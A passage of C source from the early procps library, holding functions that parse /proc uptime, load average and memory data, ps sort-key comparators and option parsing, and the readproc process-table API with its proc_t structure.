  pos += sprintf(buf + pos, " load average: %.2f, %.2f, %.2f",
		 av[0], av[1], av[2]);

  return buf;
}

void print_uptime(void)
{
  printf("%s\n", sprint_uptime());
}
/* File for parsing top-level /proc entities. */
#include "proc/sysinfo.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include <unistd.h>
#include <fcntl.h>

#define BAD_OPEN_MESSAGE					\
"Error: /proc must be mounted\n"				\
"  To mount /proc at boot you need an /etc/fstab line like:\n"	\
"      /proc   /proc   proc    defaults\n"			\
"  In the meantime, mount /proc /proc -t proc\n"

#define UPTIME_FILE  "/proc/uptime"
#define LOADAVG_FILE "/proc/loadavg"
#define MEMINFO_FILE "/proc/meminfo"

static char buf[300];

/* This macro opens FILE only if necessary and seeks to 0 so that successive
   calls to the functions are more efficient.  It also reads the current
   contents of the file into the global buf.
*/
#define FILE_TO_BUF(FILE) {					\
    static int n, fd = -1;					\
    if (fd == -1 && (fd = open(FILE, O_RDONLY)) == -1) {	\
	fprintf(stderr, BAD_OPEN_MESSAGE);			\
	close(fd);						\
	return 0;						\
    }								\
    lseek(fd, 0L, SEEK_SET);					\
    if ((n = read(fd, buf, sizeof buf - 1)) < 0) {		\
	perror(FILE);						\
	close(fd);						\
	fd = -1;						\
	return 0;						\
    }								\
    buf[n] = '\0';						\
}

#define SET_IF_DESIRED(x,y)  if (x) *(x) = (y)	/* evals 'x' twice */

int uptime(double *uptime_secs, double *idle_secs) {
    double up=0, idle=0;
    
    FILE_TO_BUF(UPTIME_FILE)
    if (sscanf(buf, "%lf %lf", &up, &idle) < 2) {
	fprintf(stderr, "bad data in " UPTIME_FILE "\n");
	return 0;
    }
    SET_IF_DESIRED(uptime_secs, up);
    SET_IF_DESIRED(idle_secs, idle);
    return up;	/* assume never be zero seconds in practice */
}

int loadavg(double *av1, double *av5, double *av15) {
    double avg_1=0, avg_5=0, avg_15=0;
    
    FILE_TO_BUF(LOADAVG_FILE)
    if (sscanf(buf, "%lf %lf %lf", &avg_1, &avg_5, &avg_15) < 3) {
	fprintf(stderr, "bad data in " LOADAVG_FILE "\n");
	exit(1);
    }
    SET_IF_DESIRED(av1,  avg_1);
    SET_IF_DESIRED(av5,  avg_5);
    SET_IF_DESIRED(av15, avg_15);
    return 1;
}

/* The following /proc/meminfo parsing routine assumes the following format:
   [ <label> ... ]				# header lines
   [ <label> ] <num> [ <num> ... ]		# table rows
   [ repeats of above line ]
   
   Any lines with fewer <num>s than <label>s get trailing <num>s set to zero.
   The return value is a NULL terminated unsigned** which is the table of
   numbers without labels.  Convenient enumeration constants for the major and
   minor dimensions are available in the header file.  Note that this version
   requires that labels do not contain digits.  It is readily extensible to
   labels which do not *begin* with digits, though.
*/

#define MAX_ROW 3	/* these are a little liberal for flexibility */
#define MAX_COL 7

unsigned** meminfo(void) {
    static unsigned *row[MAX_ROW + 1];		/* row pointers */
    static unsigned num[MAX_ROW * MAX_COL];	/* number storage */
    char *p;
    int i, j, k, l;
    
    FILE_TO_BUF(MEMINFO_FILE)
    if (!row[0])				/* init ptrs 1st time through */
	for (i=0; i < MAX_ROW; i++)		/* std column major order: */
	    row[i] = num + MAX_COL*i;		/* A[i][j] = A + COLS*i + j */
    p = buf;
    for (i=0; i < MAX_ROW; i++)			/* zero unassigned fields */
	for (j=0; j < MAX_COL; j++)
	    row[i][j] = 0;
    for (i=0; i < MAX_ROW && *p; i++) {		/* loop over rows */
	while(*p && !isdigit(*p)) p++;		/* skip chars until a digit */
	for (j=0; j < MAX_COL && *p; j++) {	/* scanf column-by-column */
	    l = sscanf(p, "%u%n", row[i] + j, &k);
	    p += k;				/* step over used buffer */
	    if (*p == '\n' || l < 1)		/* end of line/buffer */
		break;
	}
    }
/*    row[i+1] = NULL;	terminate the row list, currently unnecessary */
    return row;					/* NULL return ==> error */
}

/* shorthand for read_table("/proc/meminfo")[meminfo_main][meminfo_total] */
unsigned read_total_main(void) {
    unsigned** mem;
    return (mem = meminfo()) ? mem[meminfo_main][meminfo_total] : -1;
}
#include "proc/ps.h"
#include "proc/readproc.h"

char * status(proc_t* task) {
    static char buf[4] = "   ";

    buf[0] = task->state;
    if (task->rss == 0 && task->state != 'Z')
        buf[1] = 'W';
    else
        buf[1] = ' ';
    if (task->nice < 0)
	buf[2] = '<';
    else if (task->nice > 0)
	buf[2] = 'N';
    else
	buf[2] = ' ';

    return(buf);
}
/*
 *
 * Copyright 1994 Charles Blake and Michael K. Johnson
 * This file is a part of procps, which is distributable
 * under the conditions of the GNU Public License.  See the
 * file COPYING for details.
 *
 */

#include <string.h>		/* for strcmp */
#include <stdio.h>		/* for parse error output */
#include "proc/readproc.h"	/* for proc_t */
#include "proc/tree.h"		/* for struct tree_node */

/*
  This module was written by Charles Blake for procps.

mult_lvl_cmp:
    slick general purpose multi-level compare function I invented.
sort_depth:
    the number of levels of functions *to use*.  This means many more levels
    can be defined than mult_lvl_cmp tres out.  If this is 1 then mult_lvl_cmp
    is just a trivial wrapper around (*sort_function[0]).
sort_direction:
    multiplicative factor for the output of cmp_whatever.
    1 ==> default order, -1 ==> reverse order, 0 ==> forced equality
    The 0 bit is the neat part.  Since a value of zero is the code for equality
    multiplying the output of cmp_foo(a,b) forces a==b to be true.  This is a
    convenient way to turn sorting off in middle levels of a multi-level sort.
    If time is a problem, reforming the whole sort_function array to not include
    these unsorted middle levels will be faster since then cmp_foo won't even
    be called.  It might simplify some code depending upon how you organize it.
sort_function[]:
    array of function pointers that points to our family of comparison functions
    (I have named them cmp_* but mult_lvl_cmp doesn't care what they're named).
    This may be declared and initialized like so:
       int (*sort_function[])(void* a, void* b)={&cmp_foo, &cmp_bar, &cmp_hiho};
    You could also use my command line '-O' parser below.

Note that we only descend levels until the order is determined.  If we descend
all levels, that means that the items are equal at all levels, so we return 0.
Otherwise we return whatever the level's cmp_foo function would have returned.
This allows whatever default behavior you want for cmp_foo.  sort_direction[]
reverses this default behavior, but mult_lvl_cmp doesn't decide that ascending
or descending is the default.  That is the job of your cmp_foo's.
*/

/* the only reason these are global is because qsort(3) likes it that way.
   It's also a little more efficient if mult_lvl_cmp() is called many times.
*/

typedef int (*cmp_t)(void*,void*);	/* for function pointer casts */

int sort_depth = 0;
int sort_direction[10];     /* storage for 10 levels, but 4 would be plenty!*/
int (*sort_function[10])(void* a, void* b);

int mult_lvl_cmp(void* a, void* b) {
    int i, cmp_val;
    for(i = 0; i < sort_depth; i++) {
        cmp_val = sort_direction[i] * (*sort_function[i])(a,b);
        if (cmp_val != 0)
            return cmp_val;
    }
    return 0;
}

int node_mult_lvl_cmp(void* a, void* b) {
    int i, cmp_val;
    for(i = 0; i < sort_depth; i++) {
        cmp_val = sort_direction[i] * (*sort_function[i])(&(((struct tree_node *)a)->proc),&(((struct tree_node *)b)->proc));
        if (cmp_val != 0)
            return cmp_val;
    }
    return 0;
}

/* qsort(3) compliant comparison functions for all members of the ps_proc
   structure (in the same order in which they appear in the proc_t declaration)
   return is {-1,0,1} as {a<b, a==b, a>b}
   default ordering is ascending for all members. (flip 1,-1 to reverse)
*/
/* pre-processor macros to cut down on source size (and typing!)
   Note the use of the string concatenation operator ##
*/
#define CMP_STR(NAME) \
int cmp_ ## NAME(proc_t** P, proc_t** Q) { \
    return strcmp((*P)-> ## NAME, (*Q)-> ## NAME); \
}

#define CMP_INT(NAME) \
int cmp_ ## NAME (proc_t** P, proc_t** Q) { \
    if ((*P)-> ## NAME < (*Q)-> ## NAME) return -1; \
    if ((*P)-> ## NAME > (*Q)-> ## NAME) return  1; \
    return 0; \
}

/* Define the (46!) cmp_ functions with the above macros for every element
   of proc_t.  If the binary gets too big, we could nuke inessentials.
*/

/* CMP_STR(cmdline) */
CMP_STR(user)
CMP_STR(cmd)
/* CMP_INT(state) */
/* CMP_STR(ttyc) */
CMP_INT(uid)
CMP_INT(pid)
CMP_INT(ppid)
CMP_INT(pgrp)
CMP_INT(session)
CMP_INT(tty)
CMP_INT(tpgid)
CMP_INT(utime)
CMP_INT(stime)
CMP_INT(cutime)
CMP_INT(cstime)
/* CMP_INT(priority) */
CMP_INT(nice)
CMP_INT(start_time)
/* CMP_INT(signal) */
/* CMP_INT(blocked) */
/* CMP_INT(sigignore) */
/* CMP_INT(sigcatch) */
CMP_INT(flags)
CMP_INT(min_flt)
CMP_INT(cmin_flt)
CMP_INT(maj_flt)
CMP_INT(cmaj_flt)
/* CMP_INT(timeout) */
CMP_INT(vsize)
CMP_INT(rss)
/* CMP_INT(rss_rlim) */
/* CMP_INT(start_code) */
/* CMP_INT(end_code) */
/* CMP_INT(start_stack) */
/* CMP_INT(kstk_esp) */
/* CMP_INT(kstk_eip) */
/* CMP_INT(wchan) */
CMP_INT(pcpu)
CMP_INT(size)
CMP_INT(resident)
CMP_INT(share)
/* CMP_INT(trs) */
/* CMP_INT(lrs) */
/* CMP_INT(drs) */
/* CMP_INT(dt) */

/* define user interface to sort keys.  Fairly self-explanatory. */

struct cmp_fun_struct {
    char letter;                           /* single option-letter for key */
    char name[15];                             /* long option name for key */
    int (*fun)(proc_t**, proc_t**);  /* pointer to cmp_key */
} cmp[] = {
/*  { '?', "cmdline",       &cmp_cmdline       }, */
    { 'u', "user",          &cmp_user          },
    { 'c', "cmd",           &cmp_cmd           },
/*  { '?', "state",         &cmp_state         }, */
/*  { '?', "ttyc",          &cmp_ttyc          }, */
    { 'U', "uid",           &cmp_uid           },
    { 'p', "pid",           &cmp_pid           },
    { 'P', "ppid",          &cmp_ppid          },
    { 'g', "pgrp",          &cmp_pgrp          },
    { 'o', "session",       &cmp_session       },
    { 't', "tty",           &cmp_tty           },
    { 'G', "tpgid",         &cmp_tpgid         },
    { 'k', "utime",         &cmp_utime         },
    { 'K', "stime",         &cmp_stime         },
    { 'j', "cutime",        &cmp_cutime        },
    { 'J', "cstime",        &cmp_cstime        },
/*  { '?', "counter",       &cmp_counter       }, */
    { 'y', "priority",      &cmp_nice          },
    { 'T', "start_time",    &cmp_start_time    },
/*  { '?', "signal",        &cmp_signal        }, */
/*  { '?', "blocked",       &cmp_blocked       }, */
/*  { '?', "sigignore",     &cmp_sigignore     }, */
/*  { '?', "sigcatch",      &cmp_sigcatch      }, */
    { 'f', "flags",         &cmp_flags         },
    { 'm', "min_flt",       &cmp_min_flt       },
    { 'n', "cmin_flt",      &cmp_cmin_flt      },
    { 'M', "maj_flt",       &cmp_maj_flt       },
    { 'N', "cmaj_flt",      &cmp_cmaj_flt      },
/*  { 'C', "timeout",       &cmp_timeout       }, */
    { 'v', "vsize",         &cmp_vsize         },
    { 'r', "rss",           &cmp_rss           },
/*  { '?', "rss_rlim",      &cmp_rss_rlim      }, */
/*  { '?', "start_code",    &cmp_start_code    }, */
/*  { '?', "end_code",      &cmp_end_code      }, */
/*  { '?', "start_stack",   &cmp_start_stack   }, */
/*  { '?', "kstk_esp",      &cmp_kstk_esp      }, */
/*  { '?', "kstk_eip",      &cmp_kstk_eip      }, */
/*  { '?', "wchan",         &cmp_wchan         }, */
    { 'C', "pcpu",          &cmp_pcpu          },
    { 's', "size",          &cmp_size          },
    { 'R', "resident",      &cmp_resident      },
    { 'S', "share",         &cmp_share         },
/*  { '?', "trs",           &cmp_trs           }, */
/*  { '?', "lrs",           &cmp_lrs           }, */
/*  { '?', "drs",           &cmp_drs           }, */
/*  { '?', "dt",            &cmp_dt            }, */
    { '\0',"terminator",    NULL               }
};

void dump_keys(void) {
    int i;
    for(i=0; cmp[i].letter; i++)
        fprintf(stderr, "%s-O%c , --sort:%-15.15s%s",
		i%2?"":"           ",
		cmp[i].letter, cmp[i].name,
		i%2?"\n":"");
    if (i%2)
      fprintf(stderr, "\n");
}
 
/* command line option parsing.  Assign sort_{depth,direction[],function[]}
   based upon a string of the form:
        [+-]a[+-]b[+-]c...
   with a,b,c,... being letter flags corresponding to a particular sort
   key and the optional '-' specifying a reverse sort on that key.  + doesn't
   mean anything, but it keeps things looking balanced...
*/
int parse_sort_opt(char* opt) {
    int i, next_dir=1;
    for(; *opt ; ++opt) {
        if (*opt == '-' || *opt == '+') {
            if (*opt == '-')
                next_dir = -1;
	    opt++;
            continue;
        }
        for (i = 0; cmp[i].letter; i++)
            if (*opt == cmp[i].letter)
                break;
        if (!cmp[i].letter) {
	    fprintf(stderr,
		    "ps: no such sort key -- %c.  Possibilities are:\n", *opt);
            dump_keys();
            return -1;
        } else {
#ifdef DEBUG
	    fprintf(stderr,
		    "sort level %d: key %s, direction % d\n",
		    sort_depth, cmp[i].name, next_dir);
#endif
            sort_function[sort_depth] = (cmp_t)cmp[i].fun;
            sort_direction[sort_depth++] = next_dir;
            next_dir = 1;
        }
    }
    return 0;
}

int parse_long_sort(char* opt) {
    char* comma;
    int i, more_keys, next_dir=1;
    do {
        if (*opt == '-' || *opt == '+') {
            if (*opt == '-')
                next_dir = -1;
            more_keys = 1;
            opt++;
            continue;
        }
        more_keys = ((comma=index(opt,',')) != NULL);
	                      /* keys are ',' delimited */
        if (more_keys)
            *comma='\0';      /* terminate for strcmp() */
        for(i = 0; cmp[i].letter; ++i)
            if (strcmp(opt, cmp[i].name) == 0)
                break;
        if (!cmp[i].letter) {
            fprintf(stderr,
		    "ps: no such sort key -- %s.  Possibilities are:\n", opt);
            dump_keys();
            return -1;
        } else {
#ifdef DEBUG
	    fprintf(stderr,
		    "sort level %d: key %s, direction % d\n",
		    sort_depth, cmp[i].name, next_dir);
#endif
            sort_function[sort_depth] = (cmp_t)cmp[i].fun;
            sort_direction[sort_depth++] = next_dir;
            next_dir = 1;
        }
        opt = comma + 1; /* do next loop on next key, if more keys, else done*/
    } while (more_keys);
    return 0;
}

void reset_sort_options (void)
{
  int i;

  sort_depth=0;
  for (i=0;i<10;i++){
    sort_direction[i]=0;
    sort_function[i]=(cmp_t)NULL;
  }
}

void register_sort_function (int dir, cmp_t func)
{
    sort_function[sort_depth] = func;
    sort_direction[sort_depth++] = dir;
}
/*
 * New Interface to Process Table -- PROCTAB Stream (a la Directory streams)
 * Copyright(C) 1996. Charles L. Blake.
 */
#include "proc/version.h"
#include "proc/readproc.h"
#include "proc/devname.h"
#include "proc/ps.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/dir.h>
#include <sys/types.h>
#include <sys/stat.h>

#define Do(x) (flags & PROC_ ## x)	/* convenient shorthand */

/* initiate a process table scan
 */
PROCTAB* openproc(int flags, ...) {
    va_list ap;
    PROCTAB* PT = malloc(sizeof(PROCTAB));

    if (!Do(PID) && !(PT->procfs = opendir("/proc")))
    	return NULL;
    PT->flags = flags;
    va_start(ap, flags);		/*  Init args list */
    if (Do(PID))
    	PT->pids = va_arg(ap, pid_t*);
    else if (Do(TTY))
    	PT->ttys = va_arg(ap, dev_t*);
    else if (Do(UID)) {
    	PT->uids = va_arg(ap, uid_t*);
	PT->nuid = va_arg(ap, int);
    } else if (Do(STAT))
    	PT->stats = va_arg(ap, char*);
    va_end(ap);				/*  Clean up args list */
    if (Do(ANYTTY) && Do(TTY))
	PT->flags = PT->flags & ~PROC_TTY; /* turn off TTY flag */
    return PT;
}

/* terminate a process table scan
 */
void closeproc(PROCTAB* PT) {
    if (PT->procfs) closedir(PT->procfs);
    if (PT)         free(PT);
}

/* deallocate the space allocated by readproc if the passed rbuf was NULL
 */
void freeproc(proc_t* p) {
    if (!p)	/* in case p is NULL */
	return;
    /* ptrs are after strings to avoid copying memory when building them. */
    /* so free is called on the address of the address of strvec[0]. */
    if (p->cmdline)
	free((void*)*p->cmdline);
    if (p->environ)
	free((void*)*p->environ);
    free(p);
}

/* stat2proc() makes sure it can handle arbitrary executable file basenames
   for `cmd', i.e. those with embedded whitespace or embedded ')'s.  Such names
   confuse %s (see scanf(3)), so the string is split and %39c is used instead.
   (except for embedded ')' "(%[^)]c)" would work.
*/
void stat2proc(char* S, proc_t* P) {
    char* tmp = strrchr(S, ')');	/* split into "PID (cmd" and "<rest>" */
    *tmp = '\0';			/* replace trailing ')' with NUL */
    /* parse these two strings separately, skipping the leading "(". */
    memset(P->cmd, 0, sizeof P->cmd);	/* clear even though *P xcalloc'd ?! */
    sscanf(S, "%d (%39c", &P->pid, P->cmd);
    sscanf(tmp + 2,			/* skip space after ')' too */
	   "%c %d %d %d %d %d %u %u %u %u %u %d %d %d %d %d "
	   "%d %u %u %d %u %u %u %u %u %u %u %u %d %d %d %d %u",
	   &P->state, &P->ppid, &P->pgrp, &P->session, &P->tty, &P->tpgid,
	   &P->flags, &P->min_flt, &P->cmin_flt, &P->maj_flt, &P->cmaj_flt,
	   &P->utime, &P->stime, &P->cutime, &P->cstime, &P->priority, &P->nice,
	   &P->timeout, &P->it_real_value, &P->start_time, &P->vsize, &P->rss,
	   &P->rss_rlim, &P->start_code, &P->end_code, &P->start_stack,
	   &P->kstk_esp, &P->kstk_eip, &P->signal, &P->blocked, &P->sigignore,
	   &P->sigcatch, &P->wchan);
    if (P->tty == 0)
	P->tty = -1;  /* the old notty val, update elsewhere bef. moving to 0 */
    if (linux_version_code < LINUX_VERSION(1,3,39)) {
	P->priority = 2*15 - P->priority;	/* map old meanings to new */
	P->nice = 15 - P->nice;
    }
    if (linux_version_code < LINUX_VERSION(1,1,30) && P->tty != -1)
	P->tty = 4*0x100 + P->tty;		/* when tty wasn't full devno */
}

void statm2proc(char* s, proc_t* P) {
    sscanf(s, "%d %d %d %d %d %d %d",
	   &P->size, &P->resident, &P->share,
	   &P->trs, &P->lrs, &P->drs, &P->dt);
}

void nulls2sep(char* str, int len, char sep) {
    int i;
    for (i = 0; i < len; i++)
    	if (str[i] == 0)
    	    str[i] = sep;
}

int file2str(char *directory, char *what, char *ret, int cap) {
    static char filename[80];
    int fd, num_read;

    sprintf(filename, "%s/%s", directory, what);
    if ( (fd       = open(filename, O_RDONLY, 0)) == -1 ) return -1;
    if ( (num_read = read(fd, ret, cap - 1))      <= 0 ) return -1;
    ret[num_read] = 0;
    close(fd);
    return num_read;
}

char** file2strvec(char* directory, char* what) {
    char buf[2048];	/* read buf bytes at a time */
    char *p, *rbuf = 0, *endbuf, **q, **ret;
    int fd, tot = 0, n, c, end_of_file = 0;
    int align;

    sprintf(buf, "%s/%s", directory, what);
    if ( (fd = open(buf, O_RDONLY, 0) ) == -1 ) return NULL;

    /* read whole file into a memory buffer, allocating as we go */
    while ((n = read(fd, buf, sizeof buf - 1)) > 0) {
	if (n < sizeof buf - 1)
	    end_of_file = 1;
	if (n == 0 && rbuf == 0)
	    return NULL;	/* process died between our open and read */
	if (n < 0) {
	    if (rbuf)
		free(rbuf);
	    return NULL;	/* read error */
	}
	if (end_of_file && buf[n-1])		/* last read char not null */
	    buf[n++] = '\0';			/* so append null-terminator */
	rbuf = realloc(rbuf, tot + n);		/* allocate more memory */
	memcpy(rbuf + tot, buf, n);		/* copy buffer into it */
	tot += n;				/* increment total byte ctr */
	if (end_of_file)
	    break;
    }
    close(fd);
    if (n <= 0 && !end_of_file) {
	if (rbuf) free(rbuf);
	return NULL;		/* read error */
    }
    endbuf = rbuf + tot;			/* count space for pointers */
    align = (sizeof(char*)-1) - ((tot + sizeof(char*)-1) & (sizeof(char*)-1));
    for (c = 0, p = rbuf; p < endbuf; p++)
    	if (!*p)
	    c += sizeof(char*);
    c += sizeof(char*);				/* one extra for NULL term */

    rbuf = realloc(rbuf, tot + c + align);	/* make room for ptrs AT END */
    endbuf = rbuf + tot;			/* addr just past data buf */
    q = ret = (char**) (endbuf+align);		/* ==> free(*ret) to dealloc */
    *q++ = p = rbuf;				/* point ptrs to the strings */
    endbuf--;					/* do not traverse final NUL */
    while (++p < endbuf) 
    	if (!*p)				/* NUL char implies that */
	    *q++ = p+1;				/* next string -> next char */

    *q = 0;					/* null ptr list terminator */
    return ret;
}


/* These are some nice GNU C expression subscope "inline" functions.
   The can be used with arbitrary types and evaluate their arguments
   exactly once.
*/

/* Test if item X of type T is present in the 0 terminated list L */
#   define XinL(T, X, L) ( {			\
	    T  x = (X), *l = (L);		\
	    while (*l && *l != x) l++;		\
	    *l == x;				\
	} )

/* Test if item X of type T is present in the list L of length N */
#   define XinLN(T, X, L, N) ( {		\
	    T x = (X), *l = (L);		\
	    int i = 0, n = (N);			\
	    while (i < n && l[i] != x) i++;	\
	    i < n && l[i] == x;			\
	} )

/* readproc: return a pointer to a proc_t filled with requested info about the
 * next process available matching the restriction set.  If no more such
 * processes are available, return a null pointer (boolean false).  Use the
 * passed buffer instead of allocating space if it is non-NULL.  */

/* This is optimized so that if a PID list is given, only those files are
 * searched for in /proc.  If other lists are given in addition to the PID list,
 * the same logic can follow through as for the no-PID list case.  This is
 * fairly complex, but it does try to not to do any unnecessary work.
 * Unfortunately, the reverse filtering option in which any PID *except* the
 * ones listed is pursued.
 */
#define flags (PT->flags)
proc_t* readproc(PROCTAB* PT, proc_t* rbuf) {
    static struct direct *ent;		/* dirent handle */
    static struct stat sb;		/* stat buffer */
    static char path[32], sbuf[256];	/* bufs for stat,statm */
    int allocated = 0, matched = 0;	/* flags */
    proc_t *p = NULL;

    /* loop until a proc matching restrictions is found or no more processes */
    /* I know this could be a while loop -- this way is easier to indent ;-) */
next_proc:				/* get next PID for consideration */
    if (Do(PID)) {
	if (!*PT->pids)			/* set to next item in pids */
	    return NULL;
	sprintf(path, "/proc/%d", *(PT->pids)++);
	matched = 1;
    } else {					/* get next numeric /proc ent */
	while ((ent = readdir(PT->procfs)) &&
	       (*ent->d_name < '0' || *ent->d_name > '9'))
	    ;
	if (!ent || !ent->d_name)
	    return NULL;
	sprintf(path, "/proc/%s", ent->d_name);
    }
    if (stat(path, &sb) == -1)		/* no such dirent (anymore) */
	goto next_proc;
    if (Do(UID) && !XinLN(uid_t, sb.st_uid, PT->uids, PT->nuid))
	goto next_proc;			/* not one of the requested uids */

    if (!allocated) {				 /* assign mem for return buf */
	p = rbuf ? rbuf : xcalloc(p, sizeof *p); /* passed buf or alloced mem */
	allocated = 1;				 /* remember space is set up */
    }
    p->uid = sb.st_uid;			/* need a way to get real uid */

    if ((file2str(path, "stat", sbuf, sizeof sbuf)) == -1)
	goto next_proc;			/* error reading /proc/#/stat */
    stat2proc(sbuf, p);				/* parse /proc/#/stat */

    if (!matched && Do(TTY) && !XinL(dev_t, p->tty, PT->ttys))
	goto next_proc;			/* not one of the requested ttys */

    if (!matched && Do(ANYTTY) && p->tty == -1)
	goto next_proc;			/* no controlling terminal */

    if (!matched && Do(STAT) && !strchr(PT->stats,p->state))
	goto next_proc;			/* not one of the requested states */

    if (Do(FILLMEM)) {				/* read, parse /proc/#/statm */
	if ((file2str(path, "statm", sbuf, sizeof sbuf)) != -1 )
	    statm2proc(sbuf, p);		/* ignore statm errors here */
    }						/* statm fields just zero */

    /* some number->text resolving which is time consuming */
    if (Do(FILLTTY))
	dev_to_tty(p->ttyc, p->tty);
    if (Do(FILLUSR))
	strncpy(p->user, user_from_uid(p->uid), sizeof p->user);

    if (Do(FILLCMD))				/* read+parse /proc/#/cmdline */
	p->cmdline = file2strvec(path, "cmdline");
    if (Do(FILLENV))				/* read+parse /proc/#/environ */
	p->environ = file2strvec(path, "environ");
    
    if (p->state == 'Z')			/* fixup cmd for zombies */
	strncat(p->cmd," <zombie>", sizeof p->cmd);

    return p;
}
#undef flags

/* Convenient wrapper around openproc and readproc to slurp in the whole process
 * tree subset satisfying the constraints of flags and the optional PID list.
 * Free allocated memory with freeproctree().  The tree structure is a classic
 * left-list children + right-list siblings.  The algorithm is a two-pass of the
 * process table.  Since most process trees will have children with strictly
 * increasing PIDs, most of the structure will be picked up in the first pass.
 * The second loop then cleans up any nodes which turn out to have preceeded
 * their parent in /proc order.
 */

/* Traverse tree 't' breadth-first looking for a process with pid p */
proc_t* LookupPID(proc_t* t, pid_t p) {
    proc_t* tmp = NULL;
    if (!t)
	return NULL;
    if (t->pid == p)				/* look here/terminate recursion */
	return t;
    if ((tmp = LookupPID(t->l, p)))		/* recurse over children */
	return tmp;
    for (; t; t=t->r)				/* recurse over siblings */
	if ((tmp = LookupPID(tmp, p)))
	    return tmp;
    return NULL;
}

proc_t* readproctree(int flags, ...) {
    static proc_t tree;
    PROCTAB* PT = NULL;
    proc_t *node, *tmp=NULL, *tmp2=NULL;
    va_list ap;
    
    /* pass through apropriate arguments to openproc */
    va_start(ap, flags);
    if (Do(UID))
	PT = openproc(flags, va_arg(ap, uid_t*), va_arg(ap, int));
    else if (Do(PID) || Do(TTY) || Do(STAT))
	PT = openproc(flags, va_arg(ap, void*));
    else
	PT = openproc(flags);
    va_end(ap);

    /* first pass: build tree, putting orphans on the first level */
    tree.l = tree.r = NULL;
    while ((node = readproc(PT,0)))
	if ((tmp = LookupPID(&tree, node->ppid))) {
	    node->r = tmp->l->r;	/* node --> left list of parent */
	    tmp->l->r = node;
	} else {
	    node->r = tree.r;		/* node --> right list of 'tree' */
	    tree.r = node;
	}
    /* second pass: scan tree for PPIDs of level-1 nodes moving links as necessary */
    for (node = &tree; node; node = node->r)
	if ((tmp = LookupPID(&tree, node->r->ppid))) {
	    tmp2 = node->r;			/* unlink from right list of 'tree' */
	    node->r = node->r->r;
	    tmp2->r = tmp->l->r;		/* insert as child of found node */
	    tmp->l->r = node;
	}
    return &tree;
}

/* Convenient wrapper around openproc and readproc to slurp in the whole process
 * table subset satisfying the constraints of flags and the optional PID list.
 * Free allocated memory with freeproctab().  Access via tab[N]->member.  The
 * pointer list is NULL terminated.
 */
proc_t** readproctab(int flags, ...) {
    PROCTAB* PT = NULL;
    proc_t** tab = NULL;
    int n = 0;
    va_list ap;

    va_start(ap, flags);		/* pass through args to openproc */
    if (Do(UID))
	PT = openproc(flags, va_arg(ap, uid_t*), va_arg(ap, int));
    else if (Do(PID) || Do(TTY) || Do(STAT))
	PT = openproc(flags, va_arg(ap, void*)); /* assume ptr sizes same */
    else
	PT = openproc(flags);
    va_end(ap);
    do {					/* read table: */
	tab = realloc(tab, (n+1)*sizeof(proc_t*));/* realloc as we go, using */
	tab[n] = readproc(PT, NULL);		  /* final null to terminate */
    } while (tab[n++]);				  /* stop when NULL reached */
    return tab;
}

/* deallocate a table of pointers to proc structures
 */
void freeproctab(proc_t** tab) {
    proc_t** p;
    for(p = tab; *p; p++)
	freeproc(*p);
    free(tab);
}
/* The shadow of the original with only common prototypes now. */
#include <stdio.h>
#include <sys/types.h>
#include <linux/sched.h>

char *wchan(unsigned int);
char *find_func();
void *xcalloc(void *pointer, int size);
void *xmalloc(unsigned int size);
void *xrealloc(void *oldp, unsigned int size);
       
int   mult_lvl_cmp(void* a, void* b);
int   node_mult_lvl_cmp(void* a, void* b);
void  dump_keys(void);
       
char *user_from_uid(int uid);

int   open_sysmap(void);
int   open_psdb(void);
void  close_psdb(void);
void  make_fnctbl(void);

unsigned print_str    (FILE* file, char *s, unsigned max);
unsigned print_strlist(FILE* file, char **strs, char* sep, unsigned max);
unsigned snprint_strlist(char *buf, int max, char **strs, char *sep);
/*
 * New Interface to Process Table -- PROCTAB Stream (a la Directory streams)
 * Copyright(C) 1996. Charles L. Blake.
 */

/* Basic data structure which holds all information we can get about a process.
 * (unless otherwise specified, fields are read from /proc/#/stat)
 */
typedef struct proc_s {
    char
    	user[10],	/* user name corresponding to owner of process */
    	cmd[40],	/* basename of executable file in call to exec(2) */
    	state,		/* single-char code for process state (S=sleeping) */
    	ttyc[5],	/* string representation of controlling tty device */
	**environ,	/* environment string vector (/proc/#/environ) */
	**cmdline;	/* command line string vector (/proc/#/cmdline) */
    int
    	uid,		/* user id */
    	pid,		/* process id */
    	ppid,		/* pid of parent process */
	pgrp,		/* process group id */
	session,	/* session id */
	tty,		/* full device number of controlling terminal */
	tpgid,		/* terminal process group id */
	utime,		/* user-mode CPU time accumulated by process */
	stime,		/* kernel-mode CPU time accumulated by process */
	cutime,		/* cumulative utime of process and reaped children */
	cstime,		/* cumulative stime of process and reaped children */
	priority,	/* kernel scheduling priority */
	nice,		/* standard unix nice level of process */
	start_time,	/* start time of process -- seconds since 1-1-70 */
	signal,		/* mask of pending signals */
	blocked,	/* mask of blocked signals */
	sigignore,	/* mask of ignored signals */
	sigcatch,	/* mask of caught  signals */
    /* the next 7 members come from /proc/#/statm */
	size,		/* total 4k pages of memory */
	resident,	/* number of resident set (non-swapped) pages (4k) */
	share,		/* number of pages of shared (mmap'd) memory */
	trs,		/* text resident set size */
	lrs,		/* shared-lib resident set size */
	drs,		/* data resident set size */
	dt;		/* dirty pages */
    unsigned
	flags,		/* kernel flags for the process */
	min_flt,	/* number of minor page faults since process start */
	maj_flt,	/* number of major page faults since process start */
	cmin_flt,	/* cumulative min_flt of process and child processes */
	cmaj_flt,	/* cumulative maj_flt of process and child processes */
	timeout,	/* ? */
	it_real_value,	/* ? */
	vsize,		/* number of pages of virtual memory ... */
	rss,		/* resident set size from /proc/#/stat */
	rss_rlim,	/* resident set size ... ? */
	start_code,	/* address of beginning of code segment */
	end_code,	/* address of end of code segment */
	start_stack,	/* address of the bottom of stack for the process */
	kstk_esp,	/* kernel stack pointer */
	kstk_eip,	/* kernel stack pointer */
	wchan,		/* address of kernel wait channel proc is sleeping in */
        pcpu;           /* %CPU usage (is not filled in by readproc!!!) */
    struct proc_s *l,	/* ptrs for building arbitrary linked structs */
                  *r;	/* (i.e. singly/doubly-linked lists and trees */
} proc_t;

/* PROCTAB: data structure holding the persistent information readproc needs
 * from openproc().  The setup is intentionally similar to the dirent interface
 * and other system table interfaces (utmp+wtmp come to mind).
 */
#include <dirent.h>
#include <unistd.h>
typedef struct {
    DIR*	procfs;
    int		flags;
    pid_t*	pids;	/* pids of the procs */
    dev_t*	ttys;	/* devnos of the cttys */
    uid_t*	uids;	/* uids of procs */
